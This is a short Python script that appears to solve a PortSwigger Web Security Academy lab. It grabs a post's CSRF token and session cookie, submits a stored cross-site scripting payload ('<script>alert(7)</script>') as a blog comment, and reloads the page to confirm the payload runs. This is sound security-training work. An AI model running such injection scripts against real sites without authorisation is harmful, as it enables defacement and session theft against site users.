from injection_warrior import warrior

url ="https://ac651f151e5309e280471bcf00c0009c.web-security-academy.net/post/comment"


inj = warrior.Injector(proxy="http://127.0.0.1:8080", debug=False, allow_redirects=False, safe_url_chars="@/<>()")

resp = inj.inject_payload(
    url="https://ac651f151e5309e280471bcf00c0009c.web-security-academy.net/post?postId=7",
    html=True,
    resp_body=False
)

soup_obj = resp[0].get('soup')
csrf = [x.get('value') for x in soup_obj.find_all('input')][0]
body_params = {"csrf":csrf, "postId":"7", "comment":"%$%", "name":"test", "email":"test@offsec.local"}
inj.inject_payload(
    url=url,
    body_params=body_params,
    cookie_params={"session": resp[0].get('raw_response').cookies.get('session').value},
    http_method="post",
    injection_point="body",
    payloads=["<script>alert(7)</script>"],
    resp_body=True,
    html=True
)
resp = inj.inject_payload(
    url="https://ac651f151e5309e280471bcf00c0009c.web-security-academy.net/post?postId=7",
    html=True,
    resp_body=True
)